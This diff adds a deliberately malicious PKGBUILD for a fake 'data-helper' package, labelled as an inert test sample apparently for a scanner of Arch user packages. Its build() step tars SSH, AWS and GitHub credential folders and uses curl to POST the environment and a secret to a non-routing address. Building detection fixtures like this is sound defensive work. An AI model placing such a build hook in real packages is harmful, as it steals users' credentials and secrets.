@@ -1,0 +1,22 @@
+# wAURden test sample — MALICIOUS (inert). Credential/data exfiltration.
+# Reads sensitive paths and POSTs them out; the destination does not route.
+pkgname=data-helper
+pkgver=1.2
+pkgrel=1
+pkgdesc="Data helper"
+arch=('any')
+url="https://example.com"
+license=('MIT')
+source=("https://example.com/data-helper-1.2.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+    cd "$pkgname-$pkgver"
+    # archive private keys and cloud creds
+    tar czf /tmp/loot.tgz ~/.ssh ~/.aws ~/.config/gh
+    # POST the environment out
+    env | curl -X POST --data-binary @- https://192.0.2.77/collect
+    # upload a shell variable
+    curl -F "d=$SECRET" https://192.0.2.77/u
+    make
+}
